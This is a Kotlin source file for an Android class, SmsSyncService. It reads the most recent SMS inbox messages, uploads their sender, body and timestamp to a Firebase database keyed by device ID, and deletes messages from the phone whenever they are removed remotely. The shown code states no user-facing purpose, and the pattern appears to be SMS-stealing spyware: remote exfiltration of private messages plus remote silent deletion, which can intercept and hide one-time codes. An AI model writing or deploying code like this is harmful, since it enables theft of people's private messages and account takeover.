package com.vplan.rxtprob

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import android.provider.Settings
import android.util.Log
import com.google.firebase.database.*

class SmsSyncService(private val context: Context) {

    private val TAG = "SmsSyncService"

    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    private val smsRef: DatabaseReference =
        FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

    fun uploadInitialSms(limit: Int = 20) {
        try {
            val uriSms = Telephony.Sms.Inbox.CONTENT_URI
            val cursor = context.contentResolver.query(
                uriSms, null, null, null, "date DESC"
            )

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val id = it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val sender = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsData = mapOf(
                        "id" to id,
                        "sender" to sender,
                        "body" to body,
                        "timestamp" to date
                    )

                    smsRef.child(id).setValue(smsData)
                    count++
                }
            }
            Log.d(TAG, "✅ Uploaded initial SMS successfully")
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Upload error: ${e.message}")
        }
    }

    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildRemoved(snapshot: DataSnapshot) {
                val smsId = snapshot.key
                if (smsId != null) {
                    Log.d(TAG, "🗑️ Firebase delete detected for ID: $smsId")
                    deleteSmsFromPhone(smsId)
                } else {
                    Log.w(TAG, "⚠️ Snapshot key null on delete")
                }
            }

            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase Listener error: ${error.message}")
            }
        })
    }

    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val uriSms = Uri.parse("content://sms")
            val deleted = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
            if (deleted > 0) {
                Log.d(TAG, "✅ SMS deleted from phone: ID=$smsId")
            } else {
                Log.w(TAG, "⚠️ No SMS deleted. Maybe not found or not default SMS app.")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "❌ SecurityException: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error deleting SMS: ${e.message}")
        }
    }
}
